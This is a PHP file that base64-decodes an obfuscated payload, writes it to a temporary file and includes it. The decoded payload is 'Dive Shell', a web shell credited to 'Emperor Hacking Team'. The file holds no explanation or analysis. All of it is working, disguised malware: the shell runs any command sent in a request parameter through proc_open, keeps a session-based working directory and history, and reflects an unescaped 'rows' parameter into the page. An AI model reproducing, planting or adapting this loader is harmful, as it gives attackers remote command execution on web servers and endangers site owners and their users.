<?php
$tmp=tempnam('/tmp','FOO');
$c=base64_decode('P'.'z48P3BocAoKLypFbXBlcm9yIEhhY2tpbmcgVEVBTSAqLwogIHNlc3Npb25fc3RhcnQoKTsKaWYgKGVtcHR5KCRfU0VTU0lPTlsnY3dkJ10pIHx8ICFlbXB0eSgkX1JFUVVFU1RbJ3Jlc2V0J10pKSB7CiAgICAkX1NFU1NJT05bJ2N3ZCddID0gZ2V0Y3dkKCk7CiAgICAkX1NFU1NJT05bJ2hpc3RvcnknXSA9IGFycmF5KCk7CiAgICAkX1NFU1NJT05bJ291dHB1dCddID0gJyc7CiAgfQogIAogIGlmICghZW1wdHkoJF9SRVFVRVNUWydjb21tYW5kJ10pKSB7CiAgICBpZiAoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSkgewogICAgICAkX1JFUVVFU1RbJ2NvbW1hbmQnXSA9IHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7CiAgICB9CiAgICBpZiAoKCRpID0gYXJyYXlfc2VhcmNoKCRfUkVRVUVTVFsnY29tbWFuZCddLCAkX1NFU1NJT05bJ2hpc3RvcnknXSkpICE9PSBmYWxzZSkKICAgICAgdW5zZXQoJF9TRVNTSU9OWydoaXN0b3J5J11bJGldKTsKICAgIAogICAgYXJyYXlfdW5zaGlmdCgkX1NFU1NJT05bJ2hpc3RvcnknXSwgJF9SRVFVRVNUWydjb21tYW5kJ10pOwogIAogICAgJF9TRVNTSU9OWydvdXRwdXQnXSAuPSAnJCAnIC4gJF9SRVFVRVNUWydjb21tYW5kJ10gLiAiXG4iOwoKICAgIGlmIChlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSokJywgJF9SRVFVRVNUWydjb21tYW5kJ10pKSB7CiAgICAgICRfU0VTU0lPTlsnY3dkJ10gPSBkaXJuYW1lKF9fRklMRV9fKTsKICAgIH0gZWxzZWlmIChlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSsoW147XSspJCcsICRfUkVRVUVTVFsnY29tbWFuZCddLCAkcmVncykpIHsKCiAgICAgIGlmICgkcmVnc1sxXVswXSA9PSAnLycpIHsKCiAgICAgICAgJG5ld19kaXIgPSAkcmVnc1sxXTsKICAgICAgfSBlbHNlIHsKCiAgICAgICAgJG5ld19kaXIgPSAkX1NFU1NJT05bJ2N3ZCddIC4gJy8nIC4gJHJlZ3NbMV07CiAgICAgIH0KICAgICAgCgogICAgICB3aGlsZSAoc3RycG9zKCRuZXdfZGlyLCAnLy4vJykgIT09IGZhbHNlKQogICAgICAgICRuZXdfZGlyID0gc3RyX3JlcGxhY2UoJy8uLycsICcvJywgJG5ld19kaXIpOwoKCiAgICAgIHdoaWxlIChzdHJwb3MoJG5ld19kaXIsICcvLycpICE9PSBmYWxzZSkKICAgICAgICAkbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLycsICcvJywgJG5ld19kaXIpOwoKICAgICAgd2hpbGUgKHByZWdfbWF0Y2goJ3wvXC5cLig/IVwuKXwnLCAkbmV3X2RpcikpCiAgICAgICAgJG5ld19kaXIgPSBwcmVnX3JlcGxhY2UoJ3wvP1teL10rL1wuXC4oPyFcLil8JywgJycsICRuZXdfZGlyKTsKICAgICAgCiAgICAgIGlmICgkbmV3X2RpciA9PSAnJykgJG5ld19kaXIgPSAnLyc7CiAgICAgIAoKICAgICAgaWYgKEBjaGRpcigkbmV3X2RpcikpIHsKICAgICAgICAkX1NFU1NJT05bJ2N3ZCddID0gJG5ld19kaXI7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgJF9TRVNTSU9OWydvdXRwdXQnXSAuPSAiY2Q6IGNvdWxkIG5vdCBjaGFuZ2UgdG86ICRuZXdfZGlyXG4iOwogICAgICB9CiAgICAgIAogICAgfSBlbHNlIHsKCiAgICAgIGNoZGlyKCRfU0VTU0lPTlsnY3dkJ10pOwoKICAgICAgJGxlbmd0aCA9IHN0cmNzcG4oJF9SRVFVRVNUWydjb21tYW5kJ10sICIgXHQiKTsKICAgICAgJHRva2VuID0gc3Vic3RyKCRfUkVRVUVTVFsnY29tbWFuZCddLCAwLCAkbGVuZ3RoKTsKICAgICAgaWYgKGlzc2V0KCRhbGlhc2VzWyR0b2tlbl0pKQogICAgICAgICRfUkVRVUVTVFsnY29tbWFuZCddID0gJGFsaWFzZXNbJHRva2VuXSAuIHN1YnN0cigkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJGxlbmd0aCk7CiAgICAKICAgICAgJHAgPSBwcm9jX29wZW4oJF9SRVFVRVNUWydjb21tYW5kJ10sCiAgICAgICAgICAgICAgICAgICAgIGFycmF5KDEgPT4gYXJyYXkoJ3BpcGUnLCAndycpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAyID0+IGFycmF5KCdwaXBlJywgJ3cnKSksCiAgICAgICAgICAgICAgICAgICAgICRpbyk7CgoKICAgICAgd2hpbGUgKCFmZW9mKCRpb1sxXSkpIHsKICAgICAgICAkX1NFU1NJT05bJ291dHB1dCddIC49IGh0bWxzcGVjaWFsY2hhcnMoZmdldHMoJGlvWzFdKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRU5UX0NPTVBBVCwgJ1VURi04Jyk7CiAgICAgIH0KCiAgICAgIHdoaWxlICghZmVvZigkaW9bMl0pKSB7CiAgICAgICAgJF9TRVNTSU9OWydvdXRwdXQnXSAuPSBodG1sc3BlY2lhbGNoYXJzKGZnZXRzKCRpb1syXSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVOVF9DT01QQVQsICdVVEYtOCcpOwogICAgICB9CiAgICAgIAogICAgICBmY2xvc2UoJGlvWzFdKTsKICAgICAgZmNsb3NlKCRpb1syXSk7CiAgICAgIHByb2NfY2xvc2UoJHApOwogICAgfQogIH0KCgogIGlmIChlbXB0eSgkX1NFU1NJT05bJ2hpc3RvcnknXSkpIHsKICAgICRqc19jb21tYW5kX2hpc3QgPSAnIiInOwogIH0gZWxzZSB7CiAgICAkZXNjYXBlZCA9IGFycmF5X21hcCgnYWRkc2xhc2hlcycsICRfU0VTU0lPTlsnaGlzdG9yeSddKTsKICAgICRqc19jb21tYW5kX2hpc3QgPSAnIiIsICInIC4gaW1wbG9kZSgnIiwgIicsICRlc2NhcGVkKSAuICciJzsKICB9CgoKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOwoKZWNobyAnPD94bWwgdmVyc2lvbj0iRGl2ZS4wLjEiIGVuY29kaW5nPSJVVEYtOCI/PicgLiAiXG4iOwo/PgoKPGhlYWQ+CiAgPHRpdGxlPkRpdmUgU2hlbGwgLSBFbXBlcm9yIEhhY2tpbmcgVGVhbTwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJTaW1zaGVsbC5jc3MiIHR5cGU9InRleHQvY3NzIiAvPgoKICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgbGFuZ3VhZ2U9IkphdmFTY3JpcHQiPgogIHZhciBjdXJyZW50X2xpbmUgPSAwOwogIHZhciBjb21tYW5kX2hpc3QgPSBuZXcgQXJyYXkoPD9waHAgZWNobyAkanNfY29tbWFuZF9oaXN0ID8+KTsKICB2YXIgbGFzdCA9IDA7CgogIGZ1bmN0aW9uIGtleShlKSB7CiAgICBpZiAoIWUpIHZhciBlID0gd2luZG93LmV2ZW50OwoKICAgIGlmIChlLmtleUNvZGUgPT0gMzggJiYgY3VycmVudF9saW5lIDwgY29tbWFuZF9oaXN0Lmxlbmd0aC0xKSB7CiAgICAgIGNvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdID0gZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZTsKICAgICAgY3VycmVudF9saW5lKys7CiAgICAgIGRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsKICAgIH0KCiAgICBpZiAoZS5rZXlDb2RlID09IDQwICYmIGN1cnJlbnRfbGluZSA+IDApIHsKICAgICAgY29tbWFuZF9oaXN0W2N1cnJlbnRfbGluZV0gPSBkb2N1bWVudC5zaGVsbC5jb21tYW5kLnZhbHVlOwogICAgICBjdXJyZW50X2xpbmUtLTsKICAgICAgZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZSA9IGNvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdOwogICAgfQoKICB9CgpmdW5jdGlvbiBpbml0KCkgewogIGRvY3VtZW50LnNoZWxsLnNldEF0dHJpYnV0ZSgiYXV0b2NvbXBsZXRlIiwgIm9mZiIpOwogIGRvY3VtZW50LnNoZWxsLm91dHB1dC5zY3JvbGxUb3AgPSBkb2N1bWVudC5zaGVsbC5vdXRwdXQuc2Nyb2xsSGVpZ2h0OwogIGRvY3VtZW50LnNoZWxsLmNvbW1hbmQuZm9jdXMoKTsKfQoKICA8L3NjcmlwdD4KPC9oZWFkPgoKPGJvZHkgICBvbmxvYWQ9ImluaXQoKSIgc3R5bGU9ImNvbG9yOiAjMDBGRjAwOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwIj4KCjxzcGFuIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGIj4KCgoKPC9ib2R5PgoKPC9ib2R5Pgo8L2h0bWw+CgoKCjwvc3Bhbj4KCgoKPHA+PGZvbnQgY29sb3I9IiNGRjAwMDAiPjxzcGFuIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwIj4mbmJzcDtEaXJlY3Rvcnk6IDwvc3Bhbj4gPGNvZGU+CjxzcGFuIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwIj48P3BocCBlY2hvICRfU0VTU0lPTlsnY3dkJ10gPz48L3NwYW4+PC9jb2RlPgo8L2ZvbnQ+PC9wPgoKPGZvcm0gbmFtZT0ic2hlbGwiIGFjdGlvbj0iPD9waHAgZWNobyAkX1NFUlZFUlsnUEhQX1NFTEYnXSA/PiIgbWV0aG9kPSJQT1NUIiBzdHlsZT0iYm9yZGVyOiAxcHggc29saWQgIzgwODA4MCI+CjxkaXYgc3R5bGU9IndpZHRoOiA5ODk7IGhlaWdodDogNDU2Ij4KICA8cCBhbGlnbj0iY2VudGVyIj48Yj4KICA8Zm9udCBjb2xvcj0iI0MwQzBDMCIgZmFjZT0iVGFob21hIj5Db21tYW5kOjwvZm9udD48L2I+PGlucHV0IGNsYXNzPSJwcm9tcHQiIG5hbWU9ImNvbW1hbmQiIHR5cGU9InRleHQiCiAgICAgICAgICAgICAgICBvbmtleXVwPSJrZXkoZXZlbnQpIiBzaXplPSI4OCIgdGFiaW5kZXg9IjEiIHN0eWxlPSJib3JkZXI6IDRweCBkb3VibGUgI0MwQzBDMDsgIj4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3VibWl0IiAvPiAmbmJzcDs8Zm9udCBjb2xvcj0iIzAwMDBGRiI+CiAgPC9mb250PgogICZuYnNwOzx0ZXh0YXJlYSBuYW1lPSJvdXRwdXQiIHJlYWRvbmx5PSJyZWFkb25seSIgY29scz0iMTA3IiByb3dzPSIyMiIgc3R5bGU9ImNvbG9yOiAjRkZGRkZGOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwIj4KPD9waHAKJGxpbmVzID0gc3Vic3RyX2NvdW50KCRfU0VTU0lPTlsnb3V0cHV0J10sICJcbiIpOwokcGFkZGluZyA9IHN0cl9yZXBlYXQoIlxuIiwgbWF4KDAsICRfUkVRVUVTVFsncm93cyddKzEgLSAkbGluZXMpKTsKZWNobyBydHJpbSgkcGFkZGluZyAuICRfU0VTU0lPTlsnb3V0cHV0J10pOwo/Pgo8L3RleHRhcmVhPiA8L3A+CjxwIGNsYXNzPSJwcm9tcHQiIGFsaWduPSJjZW50ZXIiPgogIDxiPjxmb250IGZhY2U9IlRhaG9tYSIgY29sb3I9IiNDMEMwQzAiPlJvd3M6PC9mb250Pjxmb250IGZhY2U9IlRhaG9tYSIgY29sb3I9IiMwMDAwRkYiIHNpemU9IjIiPiA8L2ZvbnQ+PC9iPiAKICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icm93cyIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9SRVFVRVNUWydyb3dzJ10gPz4iIHNpemU9IjUiIC8+PC9wPgo8cCBjbGFzcz0icHJvbXB0IiBhbGlnbj0iY2VudGVyIj4KICA8Yj48Zm9udCBjb2xvcj0iI0MwQzBDMCIgZmFjZT0iU2ltU3VuIj5FZGl0ZWQgQnkgRW1wZXJvciBIYWNraW5nIFRlYW08L2ZvbnQ+PC9iPjwvcD4KPHAgY2xhc3M9InByb21wdCIgYWxpZ249ImNlbnRlciI+CiAgPGZvbnQgZmFjZT0iVGFob21hIiBzaXplPSIyIiBjb2xvcj0iIzgwODA4MCI+aU00biAtIEZhckhhZCAtIGltbTAydGFsIC0gUiRQPC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj48YnI+CiZuYnNwOzwvZm9udD48L3A+CjwvZGl2Pgo8L2Zvcm0+CgoKPHAgY2xhc3M9InByb21wdCIgYWxpZ249ImNlbnRlciI+CiAgPGI+PGZvbnQgY29sb3I9IiMwMDAwMDAiPiZuYnNwOzwvZm9udD48Zm9udCBjb2xvcj0iIzAwMDAwMCIgc2l6ZT0iMiI+IDwvZm9udD4KICA8L2I+PC9wPgoKCgo8L2h0bWw+');
file_put_contents($tmp, $c);
include $tmp;
